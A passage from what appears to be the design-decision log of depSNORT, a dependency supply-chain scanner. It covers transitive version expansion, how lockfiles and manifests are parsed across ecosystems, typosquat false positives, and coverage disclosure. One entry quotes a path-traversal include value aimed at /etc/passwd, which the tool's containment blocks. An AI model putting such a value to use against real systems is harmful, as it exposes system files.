therefore now reports INCOMPLETE where before it silently attempted nothing —
the more honest answer, and the one D-24 demands: a walk that could not see the
deep layers must say so, not imply an all-clear.

**Scope today.** The engine (`internal/expand`) and the truth axis
(`internal/graph`) are ecosystem-neutral; the per-ecosystem surface is one seam
— declare, index versions, judge a constraint — and each ecosystem implements
all three on one struct, so one walk spans several. PyPI reads requires_dist and
judges with PEP 440 (`internal/pep440`); npm reads the packument's per-version
`dependencies` and judges with a semver-range evaluator in `internal/semver`
(caret, tilde, x-ranges, hyphen ranges, AND/OR); Cargo reads the crates.io
per-version dependencies endpoint and judges with `SatisfiesCargo`, which shares
that evaluator's caret/tilde math but flips two defaults — a bare requirement is
caret, not exact, and AND is a comma. NuGet reads dependency groups from the
registration index (the one document that also carries the version list) and
judges with `internal/nugetver`, a separate version model because NuGet needs
what semver cannot give: four-part versions (`1.2.3.4`) and interval ranges
(`[1.0,2.0)`), where a bare version is a MINIMUM, not exact and not caret. All
reuse the registry clients VC-004/VC-005 already run; the per-coordinate deps
clients share one `coordFetcher` for the cache/concurrency/coverage plumbing.

NuGet also forced the walk to stop assuming a universal selection direction. npm,
PyPI, and Cargo install the HIGHEST version satisfying a constraint; NuGet
installs the LOWEST. Presuming the highest for NuGet would model a restore no
client performs, so an ecosystem now declares its direction through the optional
`LowestResolver` interface, and the walk sorts candidates accordingly — highest
by default, lowest when the declarer says so. The selection is the installer's,
not the tool's.

RubyGems and Composer completed the set with no engine change — grammar only.
Their `~>` (Ruby) and `~` (Composer) are the SAME "pessimistic" operator
(`~> 1.2` and `~1.2` both mean `>=1.2.0 <2.0.0`), distinct from npm's tilde
(`~1.2` = `<1.3.0`), so `internal/semver` grew one shared `pessimistic` helper
and two entry points over the existing caret/comparator machinery. RubyGems
reads runtime dependencies per version from the v2 API (development
dependencies excluded, like npm devDeps); Composer reads the `require` map from
the Packagist p2 document (which, like the npm packument and the NuGet
registration index, carries every version's dependencies in one fetch, so its
deps client batches by name), filtering platform requirements — php, ext-*,
lib-* — that name the runtime rather than an installable package. With these
two, expansion covers every ecosystem depSNORT resolves. Cargo also keeps build-dependencies (they
run build.rs at compile time — the install-time subgraph's own subject, D-02)
and drops dev-dependencies, which Cargo never compiles transitively. The other
three ecosystems expand as each grows its own range grammar; until one does, its
nodes stay at the frontier rather than being presumed wrongly, the D-15
decline-when-you-lack-a-basis rule.

**One guard the Cargo fixture forced, applying to every ecosystem.** The walk
descends from versioned nodes, and a vendored crate is a versioned node — but
one the lockfile recorded as path- or git-sourced (D-41). Querying a registry
for that name would answer with whatever real package happens to share it, and
graft that package's dependency tree onto the local fork: the exact
name-confusion the source class exists to prevent. The walk therefore queries a
registry only for registry-origin and unqualified nodes (D-43 qualifies only
non-registry origins, so an ordinary registry package carries no source
attribute), and leaves an explicitly non-registry node at the frontier.

npm forced one design choice the single-ecosystem sketch hid: the walker cannot
hold one global version index, because npm and PyPI resolve versions through
different clients. A declarer that also indexes its own versions (both
`WalkSource`s do) is therefore preferred per-ecosystem, and the global index is
only a fallback. That in turn surfaced a containment subtlety worth recording:
with presuming on, a declared package is created by identity graph-wide, so if
root A presumes the same coordinate root B observed, they legitimately share one
node — dedup, not borrowing, because A presumed it independently from the
registry. The guarantee that survives is narrower and correct: A's resolution is
never SWAYED by B's pin. When B has pinned a version A's constraint excludes, A
presumes its own and the two do not touch.

**Surfacing, once the walk shipped.** A presumed version that renders
identically to an observed one re-creates the very confusion the truth axis
exists to prevent, so every emitter now distinguishes them. JSON promotes
`version_truth` to a first-class node field, emitted only when not observed, so
its absence still means "from a lockfile". SARIF tags a finding whose subject is
presumed with `versionTruth`/`presumedVersion` properties, so a code-scanning
dashboard can deprioritize a finding about a coordinate that may not be in any
build — the same reason verdict already demoted it. DOT gives presumed and
contested nodes a dashed outline and a `(presumed)`/`(contested)` label. The PDF
risk table marks a presumed version `~` and a contested one `?`, with a note
that findings on them are advisory. Cypher promotes `version_truth` to a
queryable property. The rule is one line across all five: an observed node is a
fact from a lockfile and a presumed one is this tool's best guess, and they must
never look the same.

**A conformance suite, so the seam stays honest.** With all six ecosystems
expanding through the same three-method contract, the risk is the D-15 pattern
at scale: a contract kept in five sources and missed in the sixth. One
table-driven suite (`internal/ecosystem/conformance`) now runs every WalkSource
through the invariants the engine relies on but cannot enforce, because they
live in per-ecosystem code — identity normalization folds what must fold and
separates what must not (BOTH the PURL and the canonical name the walk keys its
match map on), an unreadable range declines rather than silently answering,
version ordering is a strict total order consistent with a known ascending list,
and the resolution direction matches the ecosystem's declared lowest/highest. It
runs offline over the pure methods (no registry clients), and a coverage test
fails if an ecosystem is wired into the CLI without a conformance case. Writing
it caught one latent gap: the canonical-name half of PyPI's folding was
untested, and `purl.NewPyPI` normalizing downstream had been masking it — a
node identity that folded while the match key did not would silently under-dedupe
exactly the way D-15 warned.

**The asserted tier: deps.dev, opt-in.** Presuming is this tool's guess at what
an installer would pick; deps.dev is a service that actually ran a resolver, and
its answer is a concrete version for every dependency of a coordinate. That is
the `asserted` tier the truth axis reserved from the start (D-01 named deps.dev
for exactly this). It is a distinct walk operation, not a `presume` hook,
because deps.dev resolves a WHOLE transitive graph per coordinate rather than a
single constraint: `expand.AssertRoot` merges that graph, marking every resolved
dependency `asserted` and attributing it (`asserted_by = deps.dev`), and the
presume walk then treats an asserted subtree as a closed frontier so a guess
never overwrites a real resolution. The two tiers compose cleanly — asserted
where deps.dev has an answer, presumed for the rest (deps.dev has no Composer
system, so Composer roots always fall through to presume).

Three properties keep it honest. It is OPT-IN (`-depsdev`): reaching a new
external service is an operator's policy choice, not a default, and the trust
posture differs from the package registries the tool already consults. The
observed root is never re-versioned — an asserted version for a lockfile pin
would demote a fact to a claim. And asserted still NEVER GATES: a resolver's
answer is A build's fact, not THIS build's, so verdict demotes it exactly as it
does presumed. The emitters distinguish all four states now — JSON/Cypher carry
the raw `version_truth`, SARIF tags the finding, DOT labels the node, and the
PDF marks an asserted version `+`, a presumed one `~`, a contested one `?`.

## D-45 — trial by fire: four repos, four fixes before the PR

Before opening the PR, the expansion work was run against four real repositories
(two multi-ecosystem workspaces, two Python projects). All four scanned to
completion with clean exits and correct coverage disclosure — the robustness bar
held, including graceful degradation when OSV, deps.dev, and most registries were
blocked by network policy. But the trial exposed four real defects, three of them
in exactly the case the feature exists for, and all four are fixed here.

**The manifest-only case was the whole point, and expansion missed it.** A
project with no lockfile — an unpinned requirements.txt, or a pyproject.toml
declaring PEP 621 / Poetry dependencies — is the most common thing a user points
this tool at, and expansion discovered nothing for it. The walk sourced its
declarations from the registry's per-version dependency metadata, which a LOCAL
root has no coordinate for, so a project's own direct deps were recorded as an
`unresolved` disclosure string and never presumed. Two halves:

  - Adapters now record declared-but-unpinned direct deps WITH their constraints
    on `graph.AttrDeclaredDeps` (name + constraint, no version), and expansion
    has a seed phase that presumes a version for each before the frontier walk —
    the declarations come from the local file, so they ride on the node rather
    than being fetched. On the trial repos this turned "1 node, 49 stranded
    names" into 115 nodes (113 presumed) and "no supported projects found" into
    26 nodes.
  - The PyPI adapter now reads pyproject.toml as a resolvable manifest (PEP 621
    `[project].dependencies` and Poetry `[tool.poetry.dependencies]`,
    line-scanned per D-10, no TOML dependency), gated so a pyproject that only
    configures a build backend is not claimed as a project. A Poetry/PEP 621
    project with no requirements.txt used to resolve to nothing.

**Cargo picked the wrong roots.** The adapter assumed the first `[[package]]` in
Cargo.lock was the project — but Cargo.lock is alphabetical, so it crowned
whatever sorted first (adler2, android_system_properties). Roots are now the
source-less crates (workspace members / local project) with no incoming edge,
excluding collision-marked duplicates; a registry crate always has a source and
is never a root. A root keeps the bare coordinate (it is the scan's subject, not
a dependency to verify) via a new `graph.RenameNode`, while its path provenance
stays on the source_class attr. Depth is now a multi-root shortest-distance BFS.

**npm alias deps declined when they should resolve.** A dependency declared as
`"string-width-cjs": "npm:string-width@^4.2.0"` (the npm alias protocol) landed
as contested, because the walk resolved the alias name against the registry
instead of the target. The npm walk now unwraps `npm:target@range` to resolve
the real package. Contested alias nodes went to zero on the trial repos.

The lesson the log should keep: the feature worked cleanly on lockfile'd trees —
the case that is easy to test with fixtures — and failed on the manifest-only
case that a real repository actually presents. Fixtures proved the machinery;
the trial proved the product.

## D-46 — trial by fire, round two: setup.py, the last manifest gap

A second set of four repositories, run before the PR. Three of the four
immediately discovered their trees on the round-one fixes — the new pyproject and
unpinned-requirements handling working on fresh code (57, 37, and 90 presumed
packages). The fourth, Reticulum, still reported "no supported projects found":
it declares its dependencies only in setup.py.

setup.py is arbitrary Python and D-04 forbids running it, but the common case is
static — a literal list, or a list variable referenced by install_requires —
and Reticulum is exactly that (`requirements = ['cryptography>=3.4.7',
'pyserial>=3.5']`, then `install_requires=requirements`). The adapter now reads
those two shapes statically: an inline `install_requires=[...]` literal, and an
`install_requires=<name>` that points at one or more `<name> = [...]`
assignments (union across a pure/full conditional). A setup.py that builds its
list dynamically — reads a file, calls parse_requirements — yields nothing and is
NOT claimed as a project, because asserting a dependency set the code does not
statically declare would be worse than missing it. Reticulum went from zero to a
resolved six-node tree.

That closes the manifest gap the two trials mapped out: requirements.txt (pinned
and unpinned), Pipfile.lock, pyproject.toml (PEP 621 and Poetry), and now
setup.py. The pattern across both rounds held — the machinery was sound, and
every gap was a real-world INPUT SHAPE that fixtures had not exercised. Two
rounds of real repositories found five such shapes; a fixture suite would have
found none of them.

## D-47 — trial by fire, round three: exit codes and the npm manifest

Eleven repositories, the widest net yet, spanning Cargo, npm, PyPI (requirements,
pyproject, setup.py, poetry.lock, uv.lock), Go, and a Gradle/QNX project. Eight
resolved cleanly on the earlier fixes — including the setup.py projects from
round two and the poetry.lock/uv.lock projects, which fell through to their
pyproject/requirements siblings. Two defects surfaced, both fixed.

**"No supported projects" was returning exit 70 (internal error).** A recursive
sweep that crossed a Go-only, C/RTOS, or otherwise manifest-less repo failed with
the internal-error code — which would break a CI gate run across many repos, none
of them actually broken. Nothing to scan is neither a risk finding nor an
internal error: it now exits CLEAN (0) with a loud stderr note, on both the
recursive and single-target paths. A path that does not EXIST is kept distinct —
that is a usage error (64), the operator's bad argument, not an empty-but-valid
tree. The earlier trials had reported exit 0 here only because the measurement
piped through `head`; the bug was long-standing, and the round-three harness
captured the real code.

**An npm package.json without a lockfile resolved to nothing.** A committed npm
app missing its package-lock.json is a manifest, not a resolved tree — the same
shape the PyPI pyproject fix (D-45) handled, one ecosystem over. The npm adapter
now falls back to package.json when no lock is present, emitting its runtime and
optional dependencies (dev excluded, aliases unwrapped) as declared deps for
expansion to presume. A real repo went from "no supported projects" to a 180-node
tree resolved six layers deep.

Three rounds, twelve repositories that landed something, and every single
finding was an INPUT SHAPE the fixtures never had: unpinned requirements,
pyproject, setup.py, npm aliases, Cargo's alphabetical lock, a manifest-less
tree's exit code, a lockless package.json. The machinery was right from the
start; the trials were about contact with how projects are actually committed.
What remains uncovered is disclosed, not silently wrong: Go and Gradle have no
adapter and now say "nothing to scan" cleanly, and poetry.lock/uv.lock defer to
their manifest siblings.

## D-48 — the Go module adapter, and MVS as a lowest-resolver

Go was the one primary ecosystem depSNORT could not read: a go.mod repo reported
"no supported projects". The adapter now reads go.mod's resolved require set —
every module, direct and indirect, at the exact version Go's
minimal-version-selection already pinned — with no execution (D-04: `go` is never
run). go.mod records no inter-module edges, so it is a FLAT resolution like a
pinned requirements.txt (D-24), disclosed as such; go.sum is a hash ledger, not
parsed for structure.

Expansion rebuilds the real tree by reading each module's own go.mod from
proxy.golang.org (in the egress allowlist, so it works where the other registry
hosts are blocked). Go slots into the existing walk with no engine change once
one fact is modeled right: a go.mod `require M vX` is a MINIMUM, and MVS selects,
per module, the maximum among all required minimums — which is the LOWEST version
satisfying every ">= vX" at once. So Go expresses each require as ">=version" and
declares PrefersLowest, the same NuGet-shaped resolution the walk already
supports. Presuming the newest version instead would model an upgrade Go never
performs; a live scan confirmed the walk presumes the lowest satisfying version
and never the newest.

Two properties a real scan verified. The go.mod pins are already the global MVS
result, so when a dependency requires a module at a lower minimum than the root
resolved, the walk must LINK to the observed pin, not presume a lower duplicate —
and on a 145-module project every module appeared exactly once, no
observed/presumed version split. And Go 1.17 module-graph pruning omits
deps-of-deps the root does not import, so expansion legitimately discovered 87
modules past the pruned go.mod, each read from the proxy.

Module identity is the full path including any /vN major suffix; the PURL encodes
its slashes, and reports render the raw path from the node name. The Go module
proxy's !-escaping of uppercase letters is a transport detail confined to the
proxy client.

## D-49 — Go, wired across every axis; and a references sweep

D-48 gave Go resolution and expansion. This finishes the integration so "seven
ecosystems" is true on every axis the README claims, rather than only for the
dependency graph.

- **Malicious + CVE (VC-001 / VC-008).** `ecosystemName` mapped six ecosystems;
  a `gomod` node fell through to the default and returned "gomod", which OSV does
  not recognize — Go nodes silently got zero advisory coverage. One line
  (`case "gomod": return "Go"`) closes it, and "Go" joins the offline-snapshot
  export list so a first air-gapped scan carries Go malicious coordinates too.
- **Temporal (VC-004 / VC-005).** The Go proxy has no bulk publish-time
  endpoint, so `goproxy.Client` now implements `RegistrySource` by reading the
  version list plus one `@v/{version}.info` per version for its timestamp —
  N+1 requests per module where every other registry needs one document. It is
  bounded-concurrent and long-TTL cached (both the list and each `.info` are
  immutable once published), so the cost is paid once per module and re-runs are
  free; a real 56-module scan made 577 requests in ~5s. This is the one place Go
  is structurally more expensive than the other ecosystems, and the cache is why
  it is acceptable.
- **Publisher lineage (VC-011).** The proxy exposes no per-version publisher, so
  Go records the absence as coverage state — the same non-answer the four
  registries without publisher metadata already give. Nothing to build; the
  "two of the seven registries expose it" count simply grows its denominator.
- **Fuzzing.** `go.mod` is attacker-controlled in a hostile checkout, so it gets
  a fuzz target on the same terms as the other lockfile parsers (D-33): never
  panic, and a produced graph is self-consistent.

**What is deliberately NOT done: Go install-surface extraction.** Go's
install-time reach — `//go:generate`, `cgo` link flags, package `init()` side
effects — is a real VC-002-family surface, but extracting it statically is its
own body of work, and claiming it before it exists would be exactly the
overclaim this sweep exists to remove. The README says so plainly rather than
listing a surface the tool does not read.

The rest of the change is the references it makes true: the ecosystem table, the
version-truth enum, the architecture tree, the roadmap, and every "six" that was
really "how many ecosystems" — each verified against what the code now does, not
flipped blindly (the "six" that are historical decision records, or count a
surface Go still lacks, stayed six).

## D-50 — a Cargo.lock scanned in isolation infers its root from topology

Cargo root selection preferred the source-less crates — the workspace members
and the local project, which Cargo.lock records with no `source` line (D-41).
That is the right signal when the whole workspace is present. But it left a
fallback that was wrong: when a lock has *no* source-less crate at all,
`cargoRoots` anchored the root on `entries[0]` — Cargo.lock's alphabetically
first package (`adler2`, `android_system_properties`), which is a leaf, not the
project.

The deployment shape where this bites is not exotic: a `Cargo.lock` scanned on
its own in a CI gate, split from the workspace member that would otherwise
anchor it. Every crate then carries a `source`, `localIDs` is empty, and the
scan anchored depth 0 / direct-ness on a leaf. The blast radius is bounded —
the depends-on **edges** are still correct, so every per-node check (VC-001
malicious, VC-002 install-surface, VC-008 CVE) still fires exactly as before.
What breaks is everything keyed on the *laddering*: node depth, direct vs.
transitive, root identity, and the topology digest the drift axis compares.
Reproduced cleanly — an all-sourced `realroot → leaf-utils` lock collapsed both
crates to depth 0 / `direct:false`; making `realroot` source-less snapped
`leaf-utils` back to depth 1 / `direct:true`, isolating the cause to this one
branch.

The fix keeps the source-less signal as the primary root selector and replaces
only the fallback: with no source-less crate, compute in-degree over the whole
graph and take the in-degree-0 crates as roots — the same topological criterion
the healthy path already applies to workspace members, now applied to every
crate. `entries[0]` survives as a last resort for a genuinely fully cyclic lock
(every crate has an incoming edge, so none is in-degree-0), where an arbitrary
anchor is the only way to give depth assignment somewhere to start. The
pathological lock now ladders like a healthy one, and the source-collision skip
carries over unchanged: a crate whose identity two lock entries share is an
ambiguous dependency, never a root.

## D-51 — VC-006 exempts the versioned-successor shape (a trailing digit)

A live-fire scan of `npm/cli` raised VC-006 (typosquat) on `cli-table3` — the
maintained, higher-adoption successor to the abandoned `cli-table`, which the
corpus lists. `cli-table3` is `cli-table` plus an appended `3`: edit distance 1,
identical under pure name-distance to a squat. It is the fourth VC-006 failure
mode, and like the first three (scoped names, legitimate near-neighbours,
distance-2 on short names) it is a false positive the check must suppress or it
becomes the warning tax the check's own calibration note disclaims.

The fix suppresses a candidate that is a corpus package plus ONLY a numeric
version token — a run of trailing digits, optionally set off by one `-`, `_` or
`.` separator (`cli-table3`, `through2`, `cli-table-9`). The relationship is a
strict prefix: an appended token, never an interior edit. A transposition or
substitution of the same predecessor (`cli-tabel`) is not a prefix-plus-digits
and still fires, so the suppression buys precision without blinding the check.

Scope was deliberately held to the digit shape. The assessment also suggested
word suffixes (`-ng`, `-next`), and they are a real successor convention — but
each is three or more edits from the predecessor, past this check's distance-2
ceiling (`typosquatMaxDist`), so VC-006 never produces a finding on them to
begin with. Implementing a suffix list would have been untested dead code that
only bites if the ceiling is ever raised; the honest fix is the one reachable
shape, and the code says why. The candidate-is-popular guard the assessment
offered as the alternative is already present as the exact-corpus-match skip,
and does not reach `cli-table3` precisely because the successor is not yet
corpus-listed — which is why the shape-based rule, not a data addition, is the
generalizing fix. Regression: `cli-table3`/`cli-table2`/`cli-table-9` stay
silent while `cli-tabel` still fires, pinning the boundary in both directions.

## D-52 — the asserted tier is aimed at direct dependencies, not the root

A live-fire scan found the deps.dev `asserted` tier never fired: every run
reported `0 asserted`, and every transitive node fell through to `presumed`,
even when deps.dev held the exact resolved graph. The cause was a mis-targeted
call. `expandTransitive` invoked `AssertRoot` on each project **root**, and
`AssertRoot` guards on the coordinate being registry-queryable — but the root is
the operator's own local project (path origin, D-41), which never is. So the
resolver was asked about a coordinate it could not answer, returned immediately,
and the presume walk labelled the whole tree. The merge logic was correct; it
was only ever handed the one node no resolver can resolve.

The fix moves the resolver into the walk (`Options.Resolver`) and aims it where
a coordinate exists: each root's registry-queryable **direct dependencies**,
after the seed phase has given every manifest-declared dep a presumed version
(or a lockfile has given it an observed one). A resolved dependency's whole
transitive graph is merged as asserted and the dependency is **closed** — marked
expanded, its nodes folded into the walk's containment and dedupe index — so the
presume walk never re-derives beneath it. A dependency deps.dev has no record of
simply stays on the presume path, unchanged. The project root is still walked
for its direct deps; it is just never the thing handed to the resolver.

Two correctness details rode along. Asserted nodes now ladder: `AssertRoot`
assigns depth by shortest path from the resolved coordinate (offset by that
coordinate's own depth), where before it left every asserted node at depth 0 —
a depth-0 transitive node reads as a project root, the OPU-04 failure one tier
down, and it had gone unnoticed only because the tier never fired. And the
asserted and presumed counts stay disjoint in `Result`, so the report attributes
each tier honestly. Regression: a path-origin manifest root declaring one
registry dependency, a stub resolver returning that dependency's subtree, and
assertions that the resolver is never handed the root, that the children come
back `version_truth = asserted` with `asserted_by` attribution at the right
depth, and that no presumed duplicate is created beneath the closed subtree.

## D-53 — yarn.lock is resolved by joining it to package.json

Live-fire round 2 found kibana's real dependency tree invisible: kibana uses
`yarn.lock`, the npm adapter parsed only `package-lock.json`, and the whole
application tree read as "no supported lockfile". yarn.lock is a widely used
resolved lockfile; not reading it is a real coverage hole, not a niche gap.

yarn.lock is shaped unlike package-lock.json: it is a FLAT map from each
requested "name@range" descriptor to the concrete version yarn chose, with that
version's own dependency descriptors — and it carries no root node. The project
root and its direct dependencies live in the sibling `package.json`. So the
adapter joins the two: package.json names the root and its direct deps;
yarn.lock resolves every descriptor to a version and supplies the transitive
edges. A descriptor reference resolves by exact normalized match, falling back
to the single-version-per-name case; with no package.json (or none of its deps
matched) the root anchors on in-degree-0 packages, the same topology anchor
Cargo uses (D-50), so the tree still ladders instead of collapsing to depth 0.

Both dialects are read by one parser. Yarn v1 ("classic") is a bespoke
indentation format; Yarn v2+ ("Berry") is YAML. They differ only in
punctuation — v1 quotes each descriptor and separates key from value with a
space; Berry joins descriptors in one quoted string, uses YAML colons, and
prefixes ranges with `npm:`. Normalizing the range (dropping a leading `npm:`)
makes one descriptor set match across both, so the join logic is dialect-blind.

What yarn.lock does NOT record, the adapter does not invent: an install-script
flag, a per-package dev marking, or an on-disk node_modules path. Install-surface
extraction keys on that path, so a yarn tree contributes none and surfaces as
source-unavailable rather than a fabricated location — honest under D-24, and
the one place a yarn scan is weaker than a package-lock scan. The parser is
fuzzed on the same terms as the other lockfile parsers (D-33): a hostile or
truncated yarn.lock yields a partial, self-consistent graph, never a panic.

## D-54 — requirements.txt `-r`/`-c` includes are followed, and contained

A requirements.txt can defer its pins to other files: `-r base.txt`,
`-c constraints.txt`, `-r requirements/prod.txt`. The parser skipped every such
line silently. So a file that was a few visible pins plus `-r prod.txt` resolved
CLEAN and COMPLETE over the visible few, while everything in prod.txt — the bulk
of the tree, and any poisoned pin hidden there — went unseen AND undisclosed.
That is the worst failure mode for this tool: partial visibility presented as a
finished scan. The split-across-files layout (requirements/base.txt, prod.txt,
dev.txt) is extremely common, so this was a routine miss, not a corner case.

The fix follows the includes. Each `-r`/`-c` target (both dialects, and pip's
glued `-rfile.txt` form) is resolved relative to the file that references it and
merged into the same project — its pins become nodes, its own includes recurse,
a cycle or a diamond is visited once. This is exactly the "dependencies buried
in files not documented up front" the tool exists to surface.

Following a path a checkout controls is itself an attack surface, so every
include is read through securefs, contained to the scan root the operator
pointed depsnort at (the whole-scan-root choice, so a monorepo's shared
`../requirements/base.txt` resolves while `-r ../../etc/passwd`, an absolute
path, or a symlink escape does not). An include that cannot be safely read — an
escape, a remote URL, a missing/oversized/non-regular file, or one past the
depth bound — is DISCLOSED through the same AttrUnresolved channel as an unpinned
requirement, never read and never silently dropped (D-24). Followed → covered;
unfollowable → disclosed; the one thing that can no longer happen is a
referenced file going unread AND unmentioned. The scan-root bound rides on the
PyPI adapter (set once from the top-level path); with none set, includes are
disclosed rather than followed, so the parser stays safe by default.

## D-55 — a yarn alias's security identity is the real package, not the alias

Two defects in the yarn.lock support (D-53), found scanning kibana's real tree
with live OSV.

**OPU-08 (critical): alias mis-identification → a false malicious block.** A
yarn alias binds a local name to a different real package:

    "elasticsearch-8.x@npm:@elastic/elasticsearch@8.19.1":
      version "8.19.1"
      resolved "https://registry.yarnpkg.com/@elastic/elasticsearch/-/..."

kibana installs the official `@elastic/elasticsearch@8.19.1` under the local
alias `elasticsearch-8.x`. The parser took the descriptor's LOCAL name as the
node identity, so OSV was queried as `elasticsearch-8.x` — and matched
`MAL-2025-41971`, a genuinely malicious package an attacker published under that
bare name. The result was a critical BLOCK, exit 1, on the innocent aliased
package: a false positive with real teeth, and by the same mechanism a route to
false negatives. The manifest side already unwrapped aliases
(`resolveNpmAlias`); the lockfile-entry side did not, and that asymmetry was the
bug. The fix unwraps a `npm:` alias to its real coordinate for the node's
identity — the name OSV, the registry, and typosquat see is the real package;
the alias is kept only as an `npm.alias` display label. A plain `npm:` range
(`foo@npm:^1`, `@babel/core@npm:^7` — a bare range with no embedded name) is not
an alias and keeps its own name. The corrected node is indexed under both the
alias descriptor and the real coordinate, so no edge is lost.

**OPU-07 (low): Berry phantom nodes.** Berry's `__metadata:` header and each
workspace self-entry (`"app@workspace:."`) are indent-0 blocks, so the scanner
turned them into nodes — a phantom package named `__metadata`, and a
`0.0.0-use.local` duplicate of the real root. Non-package blocks are now dropped
before node creation: an entry named `__metadata`, or one whose range protocol
is `workspace:`/`portal:`/`link:` (a local self-description, not a resolved
registry package — the real root comes from package.json). Representing
workspace MEMBERS as their own nodes is deliberately left out; when it is done
they should resolve to the root, not emit a `use.local` node.

## D-56 — OPU-09: the edit-distance-1 FP class stays in the curated allowlist

kibana's full tree (visible once yarn.lock parsed) surfaced three VC-006 false
positives on legitimate, distinct packages one edit from a popular corpus name:
`emoticon` vs `emotion`, `enquirer` vs `inquirer`, `utila` vs `util`. These are
not successor packages (OPU-05) — they are the inherent collision rate of
edit-distance-1 against a popularity corpus: two real, unrelated names that
happen to sit one edit apart.

The fix adds the three to `legitimateNpm`, the check's existing evidence-driven
exoneration set — the same mechanism that already carries the OTHER side of each
of these collisions (`motion`/emotion, `inquire`/inquirer, `utils`/util). Each
entry is an observed false positive on a real scan, exactly the bar that list
documents.

The assessment suggested a stronger signal: weigh the candidate's own registry
popularity/age, so an established package is not reported as squatting an
unrelated name. That is a real improvement, and it was deliberately NOT taken
here, because it changes what VC-006 IS. The check is purely structural by
design — embedded corpus plus edit distance, no network — which is what keeps it
deterministic and air-gap-capable (D-09). Per-candidate reputation is registry
data behind a network call; baking it into VC-006 would make an offline scan
non-deterministic and give a low-value advisory check a network failure mode.
The right home for a reputation signal is a separate opt-in enrichment, the way
the deps.dev asserted tier (D-52) is opt-in — not a change to this check. Until
that exists, the exonerated set is curated from evidence, and the cost is that a
new legitimate near-neighbour must be observed before it is added. That cost is
accepted: VC-006 is advisory and never gates, so a rare transient FP is noise,
not a blocked build, and the curated list keeps the check honest and offline.

## D-57 — OPU-10: pyproject array parsing is quote-aware (extras deps)

A PEP 621 `pyproject.toml` whose `[project].dependencies` held any entry with an
extras bracket — `requests[security]>=2.0`, `crewai[tools]>=0.100.1` — read as a
project with NO dependencies, so the whole file was skipped as "nothing to scan"
at exit 0. For a security gate that is a false negative wearing a green
checkmark: a real dependency-bearing project silently passes.

The PEP 508 layer was already correct (it strips extras downstream). The bug was
upstream in `extractArray`, which bounded the TOML array by the FIRST `]` it
saw. For an element like `"requests[security]>=2.0"` that first `]` is the extras
marker inside the quoted string, so the array collapsed to empty. Extras are
ubiquitous in Python (`uvicorn[standard]`, `celery[redis]`, `pydantic[email]`),
so this hit a broad, common shape.

The fix makes the array bound quote-aware: the closing `]` is the one at bracket
depth 0 while not inside a quoted string (`topLevelCloseBracket`), so an extras
`[`/`]` inside an element is content, not structure. The existing quoted-item
split and the empty-pyproject "not a project" detection are unchanged, so a
genuinely dependency-less build-backend-only pyproject still correctly declines
to be claimed.

The broader class this belongs to — a recognized manifest that yields zero
readable deps surfacing as coverage-incomplete rather than silent — is a
separate cross-cutting concern, not folded in here.

## D-58 — OPU-11: Composer scans a lock-less composer.json manifest-only

A `composer.json` with a full `require` block but no committed `composer.lock`
read as "nothing to scan" at exit 0 — the same silent false-clean as OPU-10, one
ecosystem over. Composer diverged from npm and PyPI, which both scan
manifest-only: `Detect` claimed a directory only when `composer.lock` was
present, so a Composer library or any lock-less project vanished from scanning
with no coverage signal. wechatAlliance (laravel/framework, guzzle, …) was
silently skipped for exactly this reason.

The fix adds a `composer.json` manifest-only path parallel to the lock path,
mirroring `npm/manifest.go` and `pypi/parsePyproject`: `Detect` now claims a
directory with either a `composer.lock` OR a `composer.json` declaring at least
one non-platform dependency; `Resolve` prefers the lock when present (observed
versions beat presumed) and otherwise parses `require`/`require-dev` into
declared deps that ride to the expansion tier for a presumed or asserted
version. Platform requirements (`php`, `hhvm`, `ext-*`, `lib-*`, `composer-*`,
and any slash-less token) are dropped — they name the runtime, not an
installable package — reusing the same rule the walk's registry client already
applies. A manifest-only project discloses its unresolved/declared state through
the same coverage channel npm and PyPI use, so it degrades coverage rather than
reading as a clean, fully-resolved tree.

This closes the second of the two round-3 silent-false-cleans. The broader class
the assessment named — NuGet's bare-`.csproj`-without-lock shape, and any
recognized-manifest-yielding-zero-deps case surfacing as coverage-incomplete
rather than silence — remains a separate cross-cutting concern, not folded in
here.

## D-59 — a recognized-but-unresolvable manifest degrades coverage, not silence

OPU-10 and OPU-11 each removed one silent false-clean — a real dependency-bearing
project reading as "nothing to scan" at exit 0. They were instances of a class:
a directory that carries a recognized dependency manifest the pipeline cannot
resolve. The assessment named a third instance (NuGet: a bare `.csproj` with
`PackageReference` and no `packages.lock.json`) and the general shape behind all
three. For a supply-chain scanner the class is the real defect: malicious intent
is rarely spelled out at the folder's root, so a manifest the tool cannot read is
exactly the place it must NOT return a green checkmark that means "did not look".

The fix moves to the discovery layer so it closes the whole class, not one more
ecosystem. A curated set of manifest filenames the adapters do NOT resolve to
dependencies — `packages.config` and `*.csproj`/`*.fsproj`/`*.vbproj` (NuGet
without a lock), `pom.xml` (Maven), `build.gradle[.kts]` (Gradle),
`pnpm-lock.yaml`, `poetry.lock`, `uv.lock`, `Pipfile`, `Gemfile` — is checked
only when normal detection finds nothing (a directory carrying a SUPPORTED
manifest is claimed by an adapter and never reaches this path, so a
legitimately dependency-less supported manifest never trips it). When one is
present, a synthetic gap "project" emits a single root that discloses the unread
manifest through the ordinary `AttrUnresolved` coverage channel, so it flows
through the existing coverage → verdict → exit path untouched: a loud "coverage
is incomplete … NOT an all-clear" on stderr, exit 3 under `-fail-on-incomplete`,
and exit 0 (but disclosed) otherwise. A genuinely manifest-less tree (Go, C, a
docs repo) still reads "nothing to scan" at exit 0, unchanged. The recursive
sweep discloses gap directories too, bounded by a cap.

The generality is the point: the next unsupported format — a Maven project, a
Gradle build, an ecosystem no adapter exists for yet — now degrades coverage
honestly instead of vanishing. Turning a manifest the tool cannot read into a
disclosed gap rather than a silent pass is the founding posture of the whole
project, applied at the one layer where every ecosystem passes through.

## D-60 — OPU-12: multi-manifest under-coverage is disclosed, not silent

A default `scan <repo>` is single-project and single-ecosystem: it offers the
one path to the adapters once. Two dependency surfaces therefore go unscanned
with no signal — projects in subdirectories (only `-recursive` reaches them),
and, in a same-directory polyglot root, every ecosystem but the one the
precedence order picks (the one-adapter-per-directory invariant, which
`-recursive` does NOT rescue). A monorepo or polyglot root then scans green on
one ecosystem while the rest of its dependency surface is invisible AND
unmentioned — the false-clean class D-59 addressed, one layer earlier.

Neither the default scope nor the one-per-directory invariant is changed; both
are defensible. What changes is disclosure. `discoveryCoverageGaps` computes, for
a run, the dependency surfaces it leaves unscanned: same-directory ecosystems
dropped by the one-per-dir rule (via `Registry.DetectAll`, in both modes), and —
for a default scan — the claimable subdirectory projects a bounded reuse of the
`-recursive` walk finds. Any it finds are emitted through the same synthetic-root
